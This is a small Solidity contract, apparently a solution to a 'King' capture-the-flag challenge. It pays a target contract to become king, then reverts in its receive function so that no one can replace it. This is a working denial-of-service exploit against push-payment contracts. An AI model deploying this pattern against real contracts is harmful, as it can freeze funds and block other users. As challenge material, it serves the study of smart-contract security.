// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

error RevertOnPurpose();
error PaymentFailed();

contract KingSolution {
    address public kingContract;

    constructor(address kingContractAddress) {
        kingContract = kingContractAddress;
    }

    function solveChallenge() public payable {
        (bool success, ) = payable(kingContract).call{value: msg.value}("");
        if (success == false) revert PaymentFailed();
    }

    receive() external payable {
        revert RevertOnPurpose();
    }
}
